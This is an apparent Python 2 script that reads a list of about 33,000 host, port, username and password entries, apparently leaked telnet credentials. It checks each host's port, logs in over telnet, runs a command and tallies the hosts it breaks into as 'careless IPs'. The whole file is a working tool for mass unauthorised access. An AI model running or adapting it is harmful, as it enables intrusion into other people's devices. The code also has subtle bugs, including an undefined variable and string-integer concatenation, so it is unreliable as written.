import sys, socket, telnetlib

count = 0
count_port_open = 0
count_port_close = 0

def portScan(target, port):
	global count_port_open, count_port_close
	try:
		s = socket.socket()
		s.settimeout(3)
		con = s.connect((target,int(port)))
		s.send("GET Shodita HTTP/1.1\r\nHost: "+target+"\r\n\r\n")
		message = s.recv(100)
		count_port_open += 1
		return True
	except:
		count_port_close += 1
		return False


def connTelnet(HOST, user, passwd):
	global count
	try:
		tn = telnetlib.Telnet(HOST)

		tn.write(user + "\n")
		if password:
			tn.write(passwd + "\n")

		tn.write("ls\n")
		tn.write("exit\n")
		print tn.read_all()
		print "|--[!][CONNECT] " + HOST + " " + user + " " + passwd
		count += 1
		print "[COUNT] " + count
	except:
		print "|--[INFO] Doesn't connect to " + HOST + " " + user + " " + passwd
		pass

def split_line(line):
	line = line.replace(" ", ":")
	data = line.split(":")
	return data

def main():
	print "**********************************"
	print "** Created by Jorge Websec      **"
	print "** Date: 30/08/2017             **"
	print "** Twitter: @JorgeWebsec        **"
	print "**********************************"
	f = open("telnet_list_33138_lines.txt", "r")
	lines = f.readlines()
	for line in lines:
		data = split_line(line)
		print "[TARGET][VERIF] " + data[0]
		if portScan(data[0], data[1]):
			print "|--[PORT] "+data[1]+" open..."
			connTelnet(data[0],data[2],data[3])
		else:
			print "|--[PORT] "+data[1]+" close..."
			continue
	f.close()
	print "*************************************************"
	print "[+]Careless IPs: " + str(count)
	print "[+]Open port 23: " + str(count_port_open)
	print "[+]Close port 23: " + str(count_port_close)
	print "*************************************************"
	print "blog.quantika14.com | botentriana.wordpress.com"
main()
